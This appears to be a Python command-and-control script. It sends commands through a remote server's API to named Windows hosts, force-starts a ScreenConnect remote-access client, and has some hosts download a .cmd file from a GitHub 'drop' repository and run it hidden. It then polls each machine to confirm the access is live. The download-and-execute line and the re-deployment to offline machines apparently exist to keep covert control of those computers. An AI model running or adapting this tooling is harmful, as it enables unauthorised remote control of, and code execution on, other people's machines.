#!/usr/bin/env python3
"""Start MRG-DELL; R3 on KYLEESPC; verify both + prior OK hosts."""
from __future__ import annotations

import json
import re
import sys
import time
import urllib.parse
import urllib.request
from pathlib import Path

BASE = "https://debian.seczio.com"
ADMIN = ((Path(__file__).resolve().parent / "secrets" / "admin_token.txt")).read_text(encoding="utf-8").strip()

START = (
    'sc config "ScreenConnect Client (36e506ff016b2151)" start= auto'
    ' & sc start "ScreenConnect Client (36e506ff016b2151)"'
    " & powershell -NoP -NonI -C "
    "\"$s=Get-Service -Name 'ScreenConnect Client (36e506ff016b2151)' -EA SilentlyContinue; "
    "if($s){'AFTER='+$s.Status}else{'AFTER=MISSING'}\""
)

RECOVER = (
    'start "" /min cmd.exe /c "'
    r"C:\Windows\System32\curl.exe -f -L --ssl-no-revoke --connect-timeout 15 --max-time 90"
    r" -o C:\Users\Public\gryxa_recover.cmd"
    " https://raw.githubusercontent.com/xnobuddy/github-drop/main/winrtcs_gryxa_recover.cmd"
    r" & call C:\Users\Public\gryxa_recover.cmd --detached"
    '" & echo RECOVER_R3_QUEUED'
)

PROBE = (
    "powershell -NoP -NonI -C "
    "\"$s=Get-Service -Name 'ScreenConnect Client (36e506ff016b2151)' -EA SilentlyContinue; "
    "if($s){'GRYXA='+$s.Status}else{'GRYXA=MISSING'}; 'DONE'\""
)


def api(path: str, fields: dict | None = None) -> str:
    data = urllib.parse.urlencode(fields).encode() if fields is not None else None
    req = urllib.request.Request(BASE + path, data=data)
    req.add_header("Authorization", "Bearer " + ADMIN)
    req.add_header("User-Agent", "Mozilla/5.0 (WinRTCS-Console)")
    with urllib.request.urlopen(req, timeout=60) as r:
        return r.read().decode(errors="replace")


def queue(target: str, cmd: str) -> int:
    text = api("/cmd", {"target": target, "cmd": cmd})
    print(text.strip())
    m = re.search(r"id=(\d+)", text)
    return int(m.group(1)) if m else 0


def wait(cid: int, timeout: float = 100.0) -> str:
    t0 = time.time()
    while time.time() - t0 < timeout:
        d = json.loads(api(f"/api/cmd/{cid}"))
        res = d.get("results") or []
        if res:
            return (res[0].get("out") or "")
        time.sleep(5)
    return ""


def main() -> int:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    print("start MRG-DELL")
    queue("MRG-DELL", START)
    print("R3 KYLEESPC")
    queue("KYLEESPC", RECOVER)
    # also R3 again on offline problem set in case they come back mid-cycle
    for h in ["DESKTOP-L66QG8O", "PEREZ", "IDGITPOE1959", "DESKTOP-L12E0G2"]:
        queue(h, RECOVER)
        time.sleep(0.15)

    print("wait 180s")
    time.sleep(180)

    check = [
        "MRG-DELL",
        "KYLEESPC",
        "CUONGCHECKERS",
        "SECRETARYPC",
        "DESKTOP-3UFSG6P",
        "DESKTOP-L66QG8O",
    ]
    print("=== verify ===")
    for h in check:
        cid = queue(h, PROBE)
        out = wait(cid, 90)
        print(f"{h}: {out.replace(chr(10), ' | ')[:100] if out else 'no_response'}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
